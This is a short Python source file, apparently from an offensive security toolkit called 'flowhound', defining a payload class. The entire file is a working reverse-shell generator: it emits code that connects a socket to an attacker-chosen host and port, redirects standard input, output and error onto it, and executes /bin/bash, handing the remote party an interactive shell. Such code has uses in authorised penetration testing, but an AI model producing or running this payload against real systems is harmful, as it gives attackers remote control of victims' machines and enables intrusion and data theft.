from flowhound.vulnerabilities.payloads.base_payload_class import PayloadBaseClass


class Payload(PayloadBaseClass):
    blocking = True  # socket.connect + os.execv block; _popen_wrap needed

    def __init__(self, lhost: str, lport: int):
        self.payload = self.generate_payload(lhost=lhost, lport=lport)

    def generate_payload(self, lhost: str, lport: int) -> str:
        return (
            "import os, socket\n"
            f"_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
            f"_s.connect(('{lhost}', {lport}))\n"
            "_fd = _s.fileno()\n"
            "os.dup2(_fd, 0); os.dup2(_fd, 1); os.dup2(_fd, 2)\n"
            "os.execv('/bin/bash', ['/bin/bash'])\n"
        )

    def load_payload(self) -> str:
        return self.payload
